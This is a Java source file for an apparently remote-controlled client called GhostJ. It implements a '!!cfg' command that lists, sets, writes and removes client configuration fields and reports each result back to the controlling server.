package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;

/**
 * cfg指令 ，统一了之前的四个cfg操作指令
 */
public class FuncConfig implements AbstractFunc {
    //!!cfg ls|write|set|rm [params]
    @Override
    public String getFuncName() {
        return "!!cfg";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<oper>","[params]"};
    }

    @Override
    public String getDescription() {
        return "操作客户端配置文件";
    }

    @Override
    public int getMinParamsAmount() {
        return 1;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        switch (params[0]){
            case "ls":{
                StringBuffer fields = new StringBuffer("客户端" + ClientMain.name + "的配置文件字段\n");
                for (String key : ClientMain.getConfig().field.keySet()) {
                    fields.append(key + "=" + ClientMain.getConfig().field.get(key) + "\n");
                }
                fields.append("列表完成");
                HandleConn.writeToServerIgnoreException(fields + "\n");
                break;
            }
            case "write":{
                ClientMain.getConfig().write();
                HandleConn.writeToServerIgnoreException("配置文件已写入\n");
                break;
            }
            case "set":{
                if(params.length<3){
                    HandleConn.writeToServerIgnoreException("命令语法不正确\n");
                    break;
                }
                //!!cfg set startupRoutine 124
                ClientMain.getConfig().set(params[1],cmd.substring(11+params[1].length()));
                HandleConn.writeToServerIgnoreException("设置"+params[1]+"="+cmd.substring(11+params[1].length())+"\n");
                break;
            }
            case "rm":{
                if(params.length<2){
                    HandleConn.writeToServerIgnoreException("命令语法不正确\n");
                    break;
                }
                try {
                    ClientMain.getConfig().field.remove(params[1]);
                    HandleConn.writeToServer("删除字段" + params[1]+"\n");
                }catch (Exception e){
                    HandleConn.writeToServerIgnoreException("出错"+ClientMain.getErrorInfo(e)+"\n");
                }
                break;
            }
            default:{
                HandleConn.writeToServerIgnoreException("无此二级命令");
                break;
            }
        }
        HandleConn.sendFinishToServer();
    }
}
